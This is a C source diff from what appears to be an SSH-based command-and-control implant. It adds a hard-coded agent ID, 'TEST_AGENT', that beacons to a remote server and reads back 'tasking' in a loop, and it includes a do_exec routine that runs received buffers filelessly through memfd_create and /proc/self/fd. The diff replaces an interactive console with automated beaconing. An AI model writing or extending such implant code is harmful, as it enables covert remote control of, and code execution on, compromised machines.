@@ -75,7 +75,7 @@ int do_exec(char *buff, int size){
 
 // Create anon FD
     int fd;
-    fd = memfd_create("", MFD_CLOEXEC);
+    fd = memfd_create("", 1U); // MFD_CLOEXEC
     write(fd, buff, size);
     char *p;
     asprintf(&p, "/proc/self/fd/%i", fd);
@@ -148,7 +148,7 @@ int authenticate_console(ssh_session);
 static void error(ssh_session);
 ssh_session connect_ssh(const char *, const char *,int);
 
-
+char *GLOB_ID = "TEST_AGENT";
 
 void remchar(char *msg, char rem, char *buff){
     int size;
@@ -418,9 +418,10 @@ ssh_session connect_ssh(const char *host, const char *user,int verbosity){
 
 int func_loop(ssh_session session)
 {
+	// Initialize vars
   	ssh_channel channel;
   	int rc;
-  	char buffer[256];
+  	char tasking[2048];
   	int nbytes;
 	int quitting = 0;
   	channel = ssh_channel_new(session);
@@ -428,6 +429,8 @@ int func_loop(ssh_session session)
 	printf("[+] Created new SSH channel\n");
   	if (channel == NULL)
     	return SSH_ERROR;
+
+	// Open channel
   	rc = ssh_channel_open_session(channel);
 	printf("[+] Opened SSH Channel with remote server\n");
   	if (rc != SSH_OK)
@@ -435,6 +438,8 @@ int func_loop(ssh_session session)
     	ssh_channel_free(channel);
     	return rc;
   	}
+
+	// Request a shell interface
   	rc = ssh_channel_request_shell(channel);
 	
 	printf("[ ] Sent request for shell\n");
@@ -446,30 +451,14 @@ int func_loop(ssh_session session)
   	}
 	printf("[+] Made it through check\n");
 
-	char inBuff[256];
-	memset(inBuff, 0, sizeof(inBuff));
+	// Begin the meat of the stuff
 
 	while (!quitting)
 	{
-		memset(inBuff, 0, sizeof(inBuff));
-		memset(buffer, 0, sizeof(buffer));
+		// Send the global ID
+		rc = ssh_channel_write(channel, GLOB_ID, strlen(GLOB_ID));
 
-		printf("Enter text > ");
-		char cleaned[256];
-		memset(cleaned, 0, sizeof(cleaned));
-		fgets(inBuff, sizeof(inBuff), stdin);
-		
-		// remove the newline from inputed text
-		remchar(inBuff, '\n', cleaned);
-
-		rc = ssh_channel_write(channel, inBuff, sizeof(inBuff));
-
-		printf("Wrote to channel\n");
-		
-		if (!strncmp(inBuff, "exit", 4)){
-			printf("Caught exit...\n");
-			break;
-		}
+		printf("Wrote ID to channel\n");
 		
 		if (rc == SSH_ERROR){
 			printf("caught ssh error: %s\n", ssh_get_error(channel));
@@ -478,30 +467,16 @@ int func_loop(ssh_session session)
     		return rc;
 		}
 
-		nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+		nbytes = ssh_channel_read(channel, tasking, sizeof(tasking), 0);
 		printf("read %d bytes from channel\n", nbytes);
 		if (nbytes < 0){
 			printf("Caught read error from server...\n");
     		ssh_channel_close(channel);
     		ssh_channel_free(channel);
     		return SSH_ERROR;
-		}
-		  
-  		/*\\
-		  while (nbytes > 0)
-  		{
-    		if (write(1, buffer, nbytes) != (unsigned int) nbytes)
-    		{
-      			ssh_channel_close(channel);
-      			ssh_channel_free(channel);
-      			return SSH_ERROR;
-    		}
-    		nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
-  		}*/
+		}		
 
-		
-
-		printf("Read data: %s\n", buffer);
+		printf("Read data: %s\n", tasking);
 	}
 	
   	
